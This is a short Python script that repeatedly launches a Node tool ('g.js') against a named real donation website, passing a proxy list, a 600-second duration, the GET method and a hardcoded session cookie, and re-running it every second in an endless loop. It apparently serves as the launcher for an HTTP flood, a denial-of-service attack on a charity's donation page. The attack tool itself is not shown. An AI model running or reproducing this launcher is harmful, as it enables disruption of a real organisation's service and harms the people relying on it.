import schedule
import time
import os
import sys

os.system('node g.js https://donate.pacquiaofoundation.org http.txt 600 GET PHPSESSID:3qvlqs6n2k3nfhk8mbhp1e0it1')

def job():
    os.system('node g.js https://donate.pacquiaofoundation.org http.txt 600 GET PHPSESSID:3qvlqs6n2k3nfhk8mbhp1e0it1')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)